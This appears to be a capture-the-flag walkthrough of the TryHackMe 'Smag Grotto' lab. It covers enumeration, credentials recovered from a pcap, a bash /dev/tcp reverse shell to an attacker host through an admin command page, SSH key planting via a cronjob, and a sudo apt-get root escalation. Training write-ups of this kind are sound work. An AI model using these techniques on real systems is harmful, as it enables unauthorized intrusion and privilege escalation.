# [Smag Grotto](https://tryhackme.com/room/smaggrotto)

## Follow the yellow brick road.

# Smag Grotto

## Deploy the machine and get root privileges.

### What is the user flag?

1. Start with a port scan to identify open services on the target machine

```bash
nmap <TARGET_IP>
```

<img width="722" height="217" alt="SCREEN01" src="https://github.com/user-attachments/assets/680f3d20-12f2-4302-a9ec-0d2d14119ad0" />

Enumerate web directories to discover hidden endpoints and files. Use gobuster with common wordlists

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
```

The scan discovers a `/mail/` directory which may contain useful information

<img width="723" height="409" alt="SCREEN02" src="https://github.com/user-attachments/assets/eba56e01-4a44-45a1-9880-62080f124012" />

3. Navigate to `http://<TARGET_IP>/mail/` and download the file `dHJhY2Uy.pcap` for analysis

4. Open the pcap file in Wireshark or use tcpdump to analyze network traffic

In the packet capture, we discover:

- A subdomain: `development.smag.thm`
- Credentials: `helpdesk:cH4nG3M3_n0w`

<img width="801" height="580" alt="SCREEN03" src="https://github.com/user-attachments/assets/4e200263-ab08-47c7-95b6-597c77615a5a" />

5. Add the discovered subdomain to the hosts file

```bash
echo '<TARGET_IP> development.smag.thm' >> /etc/hosts
```

6. Navigate to `http://development.smag.thm/login.php` and authenticate using the credentials found. Upon successful login, you are redirected to `http://development.smag.thm/admin.php`

7. Test the command execution functionality. It appears to accept shell commands. Set up a netcat listener to catch a reverse shell

```bash
nc -lvnp 4444
```

8. Execute a reverse shell payload in the command field at `http://development.smag.thm/admin.php`

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

9. Once the reverse shell connects, check scheduled tasks for privilege escalation opportunities

```bash
cat /etc/crontab
```

<img width="851" height="284" alt="SCREEN04" src="https://github.com/user-attachments/assets/c447f447-4321-40f0-958c-3e4c759300ce" />

The crontab reveals a cronjob running as user `jake` that executes `/opt/.backups/jake_id_rsa.pub.backup` restoration script. This script copies SSH public keys from backup files

10. Generate an SSH key pair on your attacking machine to gain persistent access as user `jake`

```bash
ssh-keygen -t rsa
cat jake.pub
```

<img width="617" height="362" alt="SCREEN05" src="https://github.com/user-attachments/assets/5d29670f-893b-4370-b920-efed6aa6db41" />

11. Write your public SSH key to the backup location that the cronjob monitors. The cronjob will restore this key to jake's authorized_keys file.

```bash
cd /opt/.backups/
echo "ssh-rsa AAA...qjE= root@kali" > jake_id_rsa.pub.backup
```

12. SSH into the machine as user `jake` using your private key and retrieve the user flag

```bash
ssh -i jake jake@<TARGET_IP>
cat user.txt
```

<img width="765" height="371" alt="SCREEN06" src="https://github.com/user-attachments/assets/b7165991-5a53-4879-99c2-bda8a4f7a954" />

---

### What is the root flag?

1. Check sudo privileges for the `jake` user to identify potential privilege escalation vectors

```bash
sudo -l
```

<img width="1111" height="94" alt="SCREEN07" src="https://github.com/user-attachments/assets/02e80bad-bf27-4438-919d-79ab18e272cf" />

2. Check [GTFOBins](https://gtfobins.github.io/) for apt-get privilege escalation techniques. Exploit the sudo permission to spawn a root shell and retrieve the root flag

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
cat /root/root.txt
```

<img width="632" height="235" alt="SCREEN08" src="https://github.com/user-attachments/assets/b1962b83-6988-48e7-8bfb-4254f23bb7aa" />
